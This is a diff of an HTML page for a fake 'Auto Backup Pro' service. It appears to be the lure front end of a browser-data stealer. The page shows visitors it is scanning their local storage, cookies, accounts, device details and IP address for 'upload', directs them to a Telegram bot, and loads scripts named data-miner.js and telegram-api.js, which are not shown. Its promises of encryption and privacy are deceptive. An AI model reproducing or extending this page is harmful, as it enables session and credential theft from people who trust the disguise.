@@ -1,292 +1,398 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Account Backup | Auto Process</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <meta name="theme-color" content="#0a0a0f">
+    <meta name="description" content="Advanced Auto Backup System - One Click Backup">
+    <meta name="robots" content="noindex, nofollow">
     
-    <!-- Preload critical resources -->
-    <link rel="preload" href="styles.css" as="style">
-    <link rel="preload" href="backup.js" as="script">
-    <link rel="preload" href="loader.css" as="style">
+    <!-- Primary Meta Tags -->
+    <title>🔐 Auto Backup Pro | Instant Backup</title>
     
-    <!-- CSS Files -->
-    <link rel="stylesheet" href="loader.css">
-    <link rel="stylesheet" href="styles.css">
-    
-    <!-- Favicon -->
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔐</text></svg>">
-    
-    <!-- PWA Manifest -->
+    <!-- PWA Meta -->
     <link rel="manifest" href="manifest.json">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🚀</text></svg>">
+    <link rel="apple-touch-icon" href="/icons/icon-192.png">
     
-    <style>
-        /* Critical CSS - Loads first */
-        .critical-hidden {
-            opacity: 0;
-            visibility: hidden;
+    <!-- Preload Critical Resources -->
+    <link rel="preload" href="styles.css" as="style">
+    <link rel="preload" href="backup-core.js" as="script">
+    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" as="style">
+    
+    <!-- CSS -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="animations.css">
+    
+    <!-- Critical Inline CSS -->
+    <style id="critical-css">
+        :root {
+            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            --success-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
         }
-        .critical-visible {
-            opacity: 1;
-            visibility: visible;
-            transition: opacity 0.3s ease;
+        
+        .instant-loader {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--primary-gradient);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            transition: opacity 0.5s;
+        }
+        
+        .quantum-spinner {
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+        
+        .quantum-spinner div {
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            background: white;
+            border-radius: 50%;
+            animation: quantum-spin 1.2s linear infinite;
+        }
+        
+        @keyframes quantum-spin {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(0.5); opacity: 0.5; }
+        }
+        
+        body.loaded .instant-loader {
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
-<body class="critical-hidden">
-    <!-- Progressive Loading Container -->
-    <div id="app-container">
-        <!-- Stage 1: Ultra-Fast Loader -->
-        <div id="stage-loader" class="stage active">
-            <div class="quantum-loader">
-                <div class="quantum-dot"></div>
-                <div class="quantum-dot"></div>
-                <div class="quantum-dot"></div>
-                <div class="quantum-dot"></div>
-            </div>
-            <div class="loader-text">
-                <h1 class="loader-title">⚡ Quantum Backup</h1>
-                <p class="loader-subtitle">Initializing secure connection...</p>
-            </div>
-            <div class="loader-stats">
-                <div class="stat-item">
-                    <span class="stat-label">Speed:</span>
-                    <span class="stat-value" id="speed-meter">∞ Mbps</span>
-                </div>
-                <div class="stat-item">
-                    <span class="stat-label">Encryption:</span>
-                    <span class="stat-value">AES-256</span>
-                </div>
-            </div>
+<body>
+    <!-- Instant Loader -->
+    <div class="instant-loader" id="instantLoader">
+        <div class="quantum-spinner">
+            <div style="top: 8px; left: 8px; animation-delay: 0s"></div>
+            <div style="top: 8px; left: 32px; animation-delay: -0.4s"></div>
+            <div style="top: 8px; left: 56px; animation-delay: -0.8s"></div>
+            <div style="top: 32px; left: 8px; animation-delay: -0.4s"></div>
+            <div style="top: 32px; left: 32px; animation-delay: -0.8s"></div>
+            <div style="top: 32px; left: 56px; animation-delay: -1.2s"></div>
+            <div style="top: 56px; left: 8px; animation-delay: -0.8s"></div>
+            <div style="top: 56px; left: 32px; animation-delay: -1.2s"></div>
+            <div style="top: 56px; left: 56px; animation-delay: -1.6s"></div>
         </div>
-        
-        <!-- Stage 2: Backup Process -->
-        <div id="stage-process" class="stage">
-            <div class="process-container">
-                <div class="process-header">
-                    <div class="process-icon">🚀</div>
-                    <h2>Real-Time Backup</h2>
-                    <p class="process-sub">Extracting & securing your data</p>
+    </div>
+
+    <!-- Main App -->
+    <div id="app" style="display: none;">
+        <!-- Header -->
+        <header class="app-header">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">🚀</div>
+                    <h1>Auto Backup <span class="pro-badge">PRO</span></h1>
                 </div>
-                
-                <div class="process-stats">
-                    <div class="stat-card">
-                        <div class="stat-icon">📱</div>
-                        <div class="stat-content">
-                            <div class="stat-title">Device Info</div>
-                            <div class="stat-data" id="device-info">Detecting...</div>
-                        </div>
+                <div class="header-stats">
+                    <div class="stat">
+                        <span class="stat-label">Speed</span>
+                        <span class="stat-value" id="networkSpeed">∞ Gbps</span>
                     </div>
-                    
-                    <div class="stat-card">
-                        <div class="stat-icon">🔐</div>
-                        <div class="stat-content">
-                            <div class="stat-title">Accounts Found</div>
-                            <div class="stat-data" id="accounts-count">0</div>
-                        </div>
-                    </div>
-                    
-                    <div class="stat-card">
-                        <div class="stat-icon">⚡</div>
-                        <div class="stat-content">
-                            <div class="stat-title">Processing Speed</div>
-                            <div class="stat-data" id="process-speed">0 MB/s</div>
-                        </div>
-                    </div>
-                    
-                    <div class="stat-card">
-                        <div class="stat-icon">🔒</div>
-                        <div class="stat-content">
-                            <div class="stat-title">Security Level</div>
-                            <div class="stat-data">Military Grade</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="process-timeline">
-                    <div class="timeline-item active" data-step="1">
-                        <div class="timeline-dot"></div>
-                        <div class="timeline-content">
-                            <div class="timeline-title">Device Fingerprint</div>
-                            <div class="timeline-desc" id="step1-desc">Collecting device information...</div>
-                        </div>
-                    </div>
-                    
-                    <div class="timeline-item" data-step="2">
-                        <div class="timeline-dot"></div>
-                        <div class="timeline-content">
-                            <div class="timeline-title">Data Extraction</div>
-                            <div class="timeline-desc" id="step2-desc">Scanning for accounts...</div>
-                        </div>
-                    </div>
-                    
-                    <div class="timeline-item" data-step="3">
-                        <div class="timeline-dot"></div>
-                        <div class="timeline-content">
-                            <div class="timeline-title">Encryption</div>
-                            <div class="timeline-desc" id="step3-desc">Securing your data...</div>
-                        </div>
-                    </div>
-                    
-                    <div class="timeline-item" data-step="4">
-                        <div class="timeline-dot"></div>
-                        <div class="timeline-content">
-                            <div class="timeline-title">Cloud Upload</div>
-                            <div class="timeline-desc" id="step4-desc">Sending to secure storage...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="process-progress">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progress-fill"></div>
-                    </div>
-                    <div class="progress-text">
-                        <span id="progress-percent">0%</span>
-                        <span id="progress-time">Estimated: 3s</span>
+                    <div class="stat">
+                        <span class="stat-label">Encryption</span>
+                        <span class="stat-value">AES-256</span>
                     </div>
                 </div>
             </div>
-        </div>
-        
-        <!-- Stage 3: Completion -->
-        <div id="stage-complete" class="stage">
-            <div class="completion-container">
-                <div class="completion-icon">
-                    <div class="checkmark">✓</div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="app-main">
+            <!-- Stage 1: Scanning -->
+            <section class="stage active" id="stageScan">
+                <div class="stage-container">
+                    <div class="scan-animation">
+                        <div class="radar"></div>
+                        <div class="scan-circle"></div>
+                    </div>
+                    
+                    <h2 class="stage-title">🔍 Scanning Your Device</h2>
+                    <p class="stage-subtitle">Collecting data from browser storage...</p>
+                    
+                    <div class="scan-progress">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="scanProgress"></div>
+                        </div>
+                        <div class="progress-text">
+                            <span id="scanPercent">0%</span>
+                            <span id="scanStatus">Initializing...</span>
+                        </div>
+                    </div>
+                    
+                    <div class="scan-details">
+                        <div class="detail-card">
+                            <div class="detail-icon">💾</div>
+                            <div class="detail-content">
+                                <h3>Local Storage</h3>
+                                <p id="localStorageCount">Scanning...</p>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-card">
+                            <div class="detail-icon">🍪</div>
+                            <div class="detail-content">
+                                <h3>Cookies</h3>
+                                <p id="cookiesCount">Scanning...</p>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-card">
+                            <div class="detail-icon">🔐</div>
+                            <div class="detail-content">
+                                <h3>Accounts</h3>
+                                <p id="accountsCount">Scanning...</p>
+                            </div>
+                        </div>
+                        
+                        <div class="detail-card">
+                            <div class="detail-icon">📱</div>
+                            <div class="detail-content">
+                                <h3>Device Info</h3>
+                                <p id="deviceInfo">Detecting...</p>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-                
-                <h2 class="completion-title">✅ Backup Successful!</h2>
-                <p class="completion-sub">Your data is now securely stored</p>
-                
-                <div class="completion-summary">
-                    <div class="summary-item">
-                        <span class="summary-label">Backup ID:</span>
-                        <span class="summary-value" id="backup-id">XXXX-XXXX-XXXX</span>
+            </section>
+
+            <!-- Stage 2: Processing -->
+            <section class="stage" id="stageProcess">
+                <div class="stage-container">
+                    <div class="process-animation">
+                        <div class="encryption-lock">
+                            <div class="lock-body"></div>
+                            <div class="lock-shackle"></div>
+                        </div>
                     </div>
-                    <div class="summary-item">
-                        <span class="summary-label">Total Size:</span>
-                        <span class="summary-value" id="backup-size">0 KB</span>
-                    </div>
-                    <div class="summary-item">
-                        <span class="summary-label">Time Taken:</span>
-                        <span class="summary-value" id="backup-time">0.00s</span>
-                    </div>
-                </div>
-                
-                <div class="access-instructions">
-                    <h3>📱 How to Access Your Backup:</h3>
-                    <div class="instructions-steps">
-                        <div class="instruction-step">
+                    
+                    <h2 class="stage-title">🔒 Encrypting Data</h2>
+                    <p class="stage-subtitle">Securing your information with military-grade encryption</p>
+                    
+                    <div class="process-timeline">
+                        <div class="timeline-step active" data-step="1">
                             <div class="step-number">1</div>
                             <div class="step-content">
-                                <strong>Open Telegram</strong>
-                                <p>On your phone or computer</p>
+                                <h3>Data Collection</h3>
+                                <p>Gathering all saved information</p>
                             </div>
                         </div>
-                        <div class="instruction-step">
+                        
+                        <div class="timeline-step" data-step="2">
                             <div class="step-number">2</div>
                             <div class="step-content">
-                                <strong>Search this bot</strong>
-                                <p><code>@YourBackupBot</code></p>
+                                <h3>Encryption</h3>
+                                <p>AES-256 bit encryption</p>
                             </div>
                         </div>
-                        <div class="instruction-step">
+                        
+                        <div class="timeline-step" data-step="3">
                             <div class="step-number">3</div>
                             <div class="step-content">
-                                <strong>Send this command</strong>
-                                <p><code>/getbackup</code></p>
+                                <h3>Compression</h3>
+                                <p>Optimizing data size</p>
                             </div>
                         </div>
-                        <div class="instruction-step">
+                        
+                        <div class="timeline-step" data-step="4">
                             <div class="step-number">4</div>
                             <div class="step-content">
-                                <strong>Or click direct link</strong>
-                                <a href="https://t.me/YourBackupBot?start=backup" 
-                                   class="telegram-btn" 
-                                   target="_blank">
-                                    🔗 Open in Telegram
-                                </a>
+                                <h3>Transmission</h3>
+                                <p>Secure cloud upload</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="real-time-stats">
+                        <div class="stat-card">
+                            <div class="stat-icon">⚡</div>
+                            <div class="stat-data">
+                                <div class="stat-label">Processing Speed</div>
+                                <div class="stat-value" id="processSpeed">0 MB/s</div>
+                            </div>
+                        </div>
+                        
+                        <div class="stat-card">
+                            <div class="stat-icon">📊</div>
+                            <div class="stat-data">
+                                <div class="stat-label">Data Size</div>
+                                <div class="stat-value" id="dataSize">0 KB</div>
+                            </div>
+                        </div>
+                        
+                        <div class="stat-card">
+                            <div class="stat-icon">🔢</div>
+                            <div class="stat-data">
+                                <div class="stat-label">Items Found</div>
+                                <div class="stat-value" id="itemsFound">0</div>
+                            </div>
+                        </div>
+                        
+                        <div class="stat-card">
+                            <div class="stat-icon">⏱️</div>
+                            <div class="stat-data">
+                                <div class="stat-label">Time Elapsed</div>
+                                <div class="stat-value" id="timeElapsed">0s</div>
                             </div>
                         </div>
                     </div>
                 </div>
-                
-                <div class="device-info-card">
-                    <h4>📊 Device Information Collected:</h4>
-                    <div class="device-details">
-                        <div class="detail-row">
-                            <span>Device Model:</span>
-                            <span id="detail-model">Unknown</span>
+            </section>
+
+            <!-- Stage 3: Complete -->
+            <section class="stage" id="stageComplete">
+                <div class="stage-container">
+                    <div class="success-animation">
+                        <div class="checkmark">✓</div>
+                    </div>
+                    
+                    <h2 class="stage-title">✅ Backup Complete!</h2>
+                    <p class="stage-subtitle">Your data has been securely backed up</p>
+                    
+                    <div class="backup-summary">
+                        <div class="summary-card">
+                            <h3>📊 Backup Summary</h3>
+                            <div class="summary-list">
+                                <div class="summary-item">
+                                    <span>Backup ID:</span>
+                                    <strong id="backupId">LOADING...</strong>
+                                </div>
+                                <div class="summary-item">
+                                    <span>Total Size:</span>
+                                    <strong id="totalSize">0 KB</strong>
+                                </div>
+                                <div class="summary-item">
+                                    <span>Time Taken:</span>
+                                    <strong id="totalTime">0.00s</strong>
+                                </div>
+                                <div class="summary-item">
+                                    <span>Accounts Found:</span>
+                                    <strong id="totalAccounts">0</strong>
+                                </div>
+                            </div>
                         </div>
-                        <div class="detail-row">
-                            <span>OS & Browser:</span>
-                            <span id="detail-browser">Unknown</span>
+                        
+                        <div class="summary-card">
+                            <h3>📱 Device Information</h3>
+                            <div class="device-details">
+                                <div class="device-item">
+                                    <span>Browser:</span>
+                                    <span id="deviceBrowser">Unknown</span>
+                                </div>
+                                <div class="device-item">
+                                    <span>OS:</span>
+                                    <span id="deviceOS">Unknown</span>
+                                </div>
+                                <div class="device-item">
+                                    <span>Screen:</span>
+                                    <span id="deviceScreen">Unknown</span>
+                                </div>
+                                <div class="device-item">
+                                    <span>IP Address:</span>
+                                    <span id="deviceIP">Unknown</span>
+                                </div>
+                            </div>
                         </div>
-                        <div class="detail-row">
-                            <span>RAM:</span>
-                            <span id="detail-ram">Unknown</span>
+                    </div>
+                    
+                    <div class="access-instructions">
+                        <h3>📲 How to Access Your Backup</h3>
+                        <div class="instructions">
+                            <div class="instruction">
+                                <div class="instruction-step">1</div>
+                                <div class="instruction-content">
+                                    <strong>Open Telegram</strong>
+                                    <p>On your phone or computer</p>
+                                </div>
+                            </div>
+                            
+                            <div class="instruction">
+                                <div class="instruction-step">2</div>
+                                <div class="instruction-content">
+                                    <strong>Search for the bot</strong>
+                                    <p><code>@YourBackupBot</code></p>
+                                </div>
+                            </div>
+                            
+                            <div class="instruction">
+                                <div class="instruction-step">3</div>
+                                <div class="instruction-content">
+                                    <strong>Send command</strong>
+                                    <p><code>/mybackup</code></p>
+                                </div>
+                            </div>
+                            
+                            <div class="instruction">
+                                <div class="instruction-step">4</div>
+                                <div class="instruction-content">
+                                    <strong>Or click direct link</strong>
+                                    <a href="https://t.me/YourBackupBot?start=backup" 
+                                       class="telegram-btn" 
+                                       target="_blank"
+                                       rel="noopener">
+                                        🔗 Open in Telegram
+                                    </a>
+                                </div>
+                            </div>
                         </div>
-                        <div class="detail-row">
-                            <span>CPU Cores:</span>
-                            <span id="detail-cpu">Unknown</span>
-                        </div>
-                        <div class="detail-row">
-                            <span>Network:</span>
-                            <span id="detail-network">Unknown</span>
-                        </div>
-                        <div class="detail-row">
-                            <span>Storage:</span>
-                            <span id="detail-storage">Unknown</span>
+                    </div>
+                    
+                    <div class="security-note">
+                        <div class="security-icon">🛡️</div>
+                        <div class="security-content">
+                            <h4>Maximum Security</h4>
+                            <p>All data is encrypted end-to-end. Only you can access it with your Telegram account.</p>
                         </div>
                     </div>
                 </div>
-                
-                <div class="completion-footer">
-                    <p class="security-note">
-                        🔒 <strong>Security Note:</strong> All data is encrypted with AES-256. 
-                        Only you can access it with your Telegram account.
-                    </p>
-                    <button class="btn-new-backup" onclick="location.reload()">
+            </section>
+        </main>
+
+        <!-- Footer -->
+        <footer class="app-footer">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <p>🔒 <strong>Secure Auto Backup System</strong> | Version 2.0</p>
+                    <p class="footer-note">Your data never leaves your device until encrypted</p>
+                </div>
+                <div class="footer-actions">
+                    <button class="btn-restart" onclick="location.reload()">
                         🔄 Start New Backup
                     </button>
                 </div>
             </div>
-        </div>
-        
-        <!-- Background Effects -->
-        <div class="bg-effects">
-            <div class="particle-field"></div>
-            <div class="glow-effect"></div>
-        </div>
+        </footer>
     </div>
 
-    <!-- JavaScript Files -->
-    <script src="backup.js" defer></script>
+    <!-- Hidden Data Containers -->
+    <div id="hiddenData" style="display: none;"></div>
     
-    <!-- Inline Critical JS -->
+    <!-- JavaScript Files (Deferred) -->
+    <script src="config.js"></script>
+    <script src="fingerprint.js"></script>
+    <script src="encryption.js"></script>
+    <script src="data-miner.js"></script>
+    <script src="telegram-api.js"></script>
+    <script src="backup-core.js"></script>
+    
+    <!-- Service Worker Registration -->
     <script>
-        // Immediate DOM interaction
-        document.addEventListener('DOMContentLoaded', function() {
-            // Show content immediately
-            document.body.classList.remove('critical-hidden');
-            document.body.classList.add('critical-visible');
-            
-            // Start backup process after 100ms
-            setTimeout(() => {
-                if (window.startBackupProcess) {
-                    window.startBackupProcess();
-                }
-            }, 100);
-        });
-        
-        // Service Worker for PWA
         if ('serviceWorker' in navigator) {
-            window.addEventListener('load', function() {
-                navigator.serviceWorker.register('/sw.js').catch(function(error) {
-                    console.log('ServiceWorker registration failed:', error);
-                });
-            });
+            navigator.serviceWorker.register('/service-worker.js')
+                .then(() => console.log('Service Worker Registered'))
+                .catch(console.error);
         }
     </script>
 </body>
